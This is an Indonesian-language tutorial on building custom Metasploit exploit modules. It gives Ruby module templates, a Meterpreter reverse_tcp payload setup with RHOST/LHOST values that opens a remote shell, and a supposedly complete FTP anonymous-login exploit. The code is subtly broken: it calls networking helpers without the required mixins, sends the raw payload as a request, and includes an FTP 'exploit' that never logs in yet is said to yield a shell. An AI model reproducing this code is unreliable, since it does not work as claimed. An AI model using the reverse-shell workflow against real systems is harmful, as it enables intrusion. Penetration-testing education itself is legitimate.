# Membuat Modul Exploit Sendiri di Metasploit

## A. Pengantar Modul Exploit di Metasploit

Metasploit Framework adalah kerangka kerja eksploitasi yang sangat kuat yang memungkinkan para peretas (ethical hacking) untuk melakukan eksploitasi dan pengujian penetrasi terhadap sistem. Modul eksploitasi adalah komponen yang digunakan untuk mengeksploitasi kelemahan atau kerentanannya.

Modul eksploitasi biasanya terdiri dari:
- **Exploit**: Kode yang mengeksploitasi kerentanannya.
- **Payload**: Kode yang dijalankan setelah eksploitasi berhasil.
- **Encoder**: Untuk mengaburkan payload agar sulit dideteksi.

## 2. Persiapan dan Struktur Metasploit

Untuk membuat modul eksploitasi di Metasploit, kamu harus mengerti struktur dasarnya terlebih dahulu. Lokasi Modul di Metasploit:

Semua modul Metasploit, termasuk eksploitasi, terletak di direktori:

```
/usr/share/metasploit-framework/modules/exploits/
```

Struktur dasar direktori sebuah modul adalah:

```
modules/
 ├── exploits/
 │    ├── multi/
 │    ├── unix/
 │    ├── windows/
 │    └── ...
 └── auxiliary/
      ├── scanner/
      └── ...
```

Modul eksploitasi biasanya berada di dalam direktori `exploits/` dengan subdirektori berdasarkan platform, seperti `windows/`, `unix/`, atau `multi/`.

## C. Langkah-langkah Membuat Modul Exploit

### 1. Menyiapkan Lingkungan Pengembangan

**1. Jalankan Metasploit:**

```
msfconsole
```

2. Temukan modul eksploitasi yang ada untuk referensi.

Misalnya, jika ingin melihat eksploitasi Windows:

```
search type:exploit platform:windows
```

3. Navigasi ke direktori tempat kamu akan menyimpan modul baru:

```
cd /usr/share/metasploit-framework/modules/exploits/
```

### 2. Membuat Struktur Modul Baru**

1. Buat file Ruby baru untuk modul eksploitasi.

Misalnya:

```
nano /usr/share/metasploit-framework/modules/exploits/custom/my_exploit.rb
```

2. Tulis Struktur Dasar Modul:

Berikut adalah template untuk modul eksploitasi:

```rb
require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'My Custom Exploit',
      'Description'    => %q{
        This is a custom exploit module.
      },
      'Author'         => ['Your Name'],
      'License'        => MSF_LICENSE,
      'References'     =>
        [],
      'Payload'        =>
        {'Space' => 1024, 'BadChars' => "\x00"},
      'Platform'       => ['linux', 'win', 'osx'],
      'Arch'           => ARCH_X86,
      'Targets'        =>
        [
          ['Automatic', { 'Arch' => ARCH_X86, 'Platform' => 'win' }]
        ],
      'DefaultTarget'  => 0))
    
    register_options([Opt::RPORT(80)], self.class)
  end

  def exploit
    print_status("Exploiting target #{rhost}:#{rport}")
    
    # Payload execution
    connect
    send_request_raw(payload)
    handler
  end
end
```

Penjelasan Struktur Modul:
- `initialize`: Digunakan untuk mendefinisikan informasi dasar modul, seperti nama, deskripsi, penulis, target, dan payload.
- `exploit`: Merupakan fungsi utama yang melakukan eksploitasi. Fungsi ini menghubungkan ke target dan mengirimkan payload.

### 3. Menambahkan Fungsionalitas

Kamu dapat menambahkan berbagai jenis eksploitasi, seperti:

- Buffer Overflow: Menyuntikkan payload ke dalam buffer yang rentan.
- Remote Code Execution (RCE): Mengeksekusi kode pada target yang rentan.
- Command Injection: Menyuntikkan perintah ke sistem target.

Contoh fungsi untuk mengirimkan payload pada target:

```rb
def exploit
  connect
  print_status("Sending exploit...")
  send_request_raw(payload)
  handler
end
```

### 4. Menggunakan Payload Custom

Jika kamu ingin menggunakan payload custom, kamu bisa mengonfigurasi payload sesuai dengan tujuanmu.

Contoh menggunakan payload Meterpreter untuk Windows:

```
payload = 'windows/meterpreter/reverse_tcp'
```

Penggunaan payload dalam fungsi:

```rb
def exploit
  print_status("Sending Meterpreter payload...")
  payload = generate_payload('windows/meterpreter/reverse_tcp')
  send_request_raw(payload)
  handler
end
```

### 5. Menguji Modul Exploit

Setelah membuat modul, kamu bisa menguji modulnya menggunakan Metasploit.

**1. Periksa apakah modul sudah terdaftar:**

```
msfconsole
search my_exploit
```

**2. Gunakan modul baru:**

```
use exploits/custom/my_exploit
```

**3. Konfigurasi opsi (seperti target, RHOST, RPORT):**

```
set RHOST 192.168.1.100
set RPORT 80
set LHOST 192.168.1.10
set LPORT 4444
```

**4. Jalankan eksploitasi:**

```
exploit
```

Jika modulmu berhasil, kamu akan mendapatkan shell atau meterpreter session.

## 6. Debugging dan Penyempurnaan

Jika ada masalah dengan modul eksploitasi:

- Periksa `log` dan `output` Metasploit.
- Gunakan `print_status` untuk debug:

  ```
  print_status("Payload sent successfully")
  ```

- Pastikan payload dan koneksi target sudah sesuai dengan yang ditargetkan.

### 7. Contoh Modul Exploit Lengkap

Modul exploit untuk mengakses FTP Anonymous Login:

```rb
require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'FTP Anonymous Login Exploit',
      'Description'    => 'Exploits an FTP service that allows anonymous login.',
      'Author'         => 'Your Name',
      'License'        => MSF_LICENSE,
      'References'     => [],
      'Platform'       => ['unix'],
      'Targets'        =>
        [
          ['FTP Anonymous', { 'Arch' => ARCH_X86, 'Platform' => 'unix' }]
        ],
      'Payload'        =>
        { 'Space' => 1024, 'BadChars' => "\x00" },
      'DefaultTarget'  => 0))

    register_options([Opt::RPORT(21)], self.class)
  end

  def exploit
    connect
    print_status("Attempting anonymous FTP login...")
    send_request_raw(payload)
    handler
  end
end
```
